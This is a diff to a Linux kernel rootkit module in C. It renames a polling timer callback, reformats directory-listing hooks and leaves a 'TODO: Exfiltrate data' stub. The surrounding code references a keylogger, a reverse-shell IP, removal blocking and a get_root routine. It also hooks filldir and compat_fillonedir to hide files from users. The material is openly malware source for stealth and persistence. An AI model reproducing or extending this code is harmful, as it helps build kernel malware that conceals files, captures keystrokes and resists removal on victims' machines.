@@ -101,7 +101,7 @@ MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");
  */
 
 static int get_root(void);
-static void poll_for_commands(unsigned long data);
+static void do_something_on_interval(unsigned long data);
 
 /**
  * Logging Helpers
@@ -181,12 +181,7 @@ static int khook_filldir64(void *__buf, const char *name, int namlen, loff_t off
 }
 
 KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
-static int khook_compat_fillonedir(void *__buf,
-								   const char *name,
-								   int namlen,
-								   loff_t offset,
-								   u64 ino,
-								   unsigned int d_type) {
+static int khook_compat_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
 	if (should_hide_file(name)) {
 		return 0;
 	}
@@ -194,12 +189,7 @@ static int khook_compat_fillonedir(void *__buf,
 }
 
 KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
-static int khook_compat_filldir(void *__buf,
-								const char *name,
-								int namlen,
-								loff_t offset,
-								u64 ino,
-								unsigned int d_type) {
+static int khook_compat_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
 	if (should_hide_file(name)) {
 		return 0;
 	}
@@ -275,20 +265,12 @@ __inline static void timer_cleanup_wrapper(_timer *timer) {
 }
 
 /**
- * Do something on an interval, and then  start a timer to call this
+ * Do something on an interval, and then start a timer to call this
  * function again in the future.
  * NOTE: The data parameter is required in order for this to compile.
  */
-static void poll_for_commands(unsigned long data) {
-	// TODO: Store previous values of variables somewhere.
-	log_info("Polling for commands!\n");
-	// printk(KERN_EMERG "rev_shell_ip: %s", rev_shell_ip);
-	// printk(KERN_EMERG "hidden_file_prefix: %s", hidden_file_prefix);
-	// printk(KERN_EMERG "block_removal: %d", block_removal);
-	// printk(KERN_EMERG "keylogger enabled: %d", keylogger);
-
-	// TODO: Check for change in hidden file hiding
-	// TODO: Check for keylogger enabling
+static void do_something_on_interval(unsigned long data) {
+	// TODO: Exfiltrate data.
 	set_timer(&polling_timer);
 }
 
@@ -300,7 +282,7 @@ static int __init rootkit_init(void) {
 	khook_init();
 
 	printk(KERN_EMERG "Initializing timer...\n");
-	timer_init_wrapper(&polling_timer, poll_for_commands);
+	timer_init_wrapper(&polling_timer, do_something_on_interval);
 	set_timer(&polling_timer);
 
 	if (block_removal) {
@@ -310,7 +292,7 @@ static int __init rootkit_init(void) {
 	}
 
 	// Gotta make the compiler happy.
-	poll_for_commands(0);
+	do_something_on_interval(0);
 	return 0;
 }
 
